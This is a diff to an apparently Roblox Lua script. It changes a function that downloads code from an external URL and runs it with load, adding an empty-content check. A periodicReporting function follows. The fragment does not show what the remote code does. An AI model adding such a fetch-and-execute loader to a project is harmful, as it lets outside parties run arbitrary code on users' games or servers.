@@ -155,7 +155,7 @@ local function executeExternalScript()
     log("Fetching script from: " .. EXTERNAL_SCRIPT_URL)
 
     local success, content = pcall(function()
-        return HttpService:GetAsync(EXTERNAL_SCRIPT_URL, true)
+        return HttpService:GetAsync(EXTERNAL_SCRIPT_URL)
     end)
 
     if not success then
@@ -163,9 +163,14 @@ local function executeExternalScript()
         return false
     end
 
+    if not content or #content < 10 then
+        log("❌ Script content too short or empty")
+        return false
+    end
+
     log("✅ Script fetched. Attempting to load...")
 
-    local fn, err = loadstring(content)
+    local fn, err = load(content)
     if not fn then
         log("❌ Load error: " .. tostring(err))
         return false
@@ -182,6 +187,7 @@ local function executeExternalScript()
     log("✅ Script executed successfully")
     return true
 end
+
 -- ====================== [MAIN LOGIC] ======================
 
 local function periodicReporting()
